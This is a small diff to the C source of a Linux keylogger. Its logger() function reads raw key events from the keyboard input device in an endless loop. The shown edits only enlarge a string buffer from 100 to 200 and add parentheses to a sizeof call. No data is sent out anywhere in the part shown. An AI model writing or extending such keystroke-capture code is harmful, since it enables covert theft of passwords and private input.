@@ -8,7 +8,7 @@
 #include "./key.h"
 #include "./keylogger.h"
 
-#define str_len 100
+#define str_len 200
 
 int logger(){
     const char *kbin = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
@@ -26,7 +26,7 @@ int logger(){
     char str[str_len] = "";
 
     while(1){
-        n = read(fd, &ev, sizeof ev); /* read buffer */
+        n = read(fd, &ev, sizeof(ev)); /* read buffer */
         if(ev.type == EV_KEY && ev.value == 1){
             //printf("%d\n", ev.code);
             while(i < 48){
